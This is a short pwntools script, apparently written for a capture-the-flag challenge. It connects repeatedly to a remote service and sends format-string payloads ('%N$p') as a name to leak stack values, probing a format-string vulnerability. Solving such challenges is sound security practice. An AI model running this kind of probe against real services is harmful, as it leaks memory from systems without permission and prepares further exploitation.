from pwn import *
import sys

exe = './snow-factory/snow_factory'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'critical'

def check():
    for i in range(1, 71):
        try:
            p = remote('snow-factory.julec.tf', 1337, ssl=True)
            p.sendlineafter(b"What's your name: ", '%{}$p'.format(i).encode())
            p.recvuntil(b"Hello ")
            result = p.recvline().decode().strip()
            print(f"{i}: {result}", flush=True)
            p.close()
        except Exception as e:
            print(f"Error {i}: {e}", flush=True)

if __name__ == "__main__":
    check()
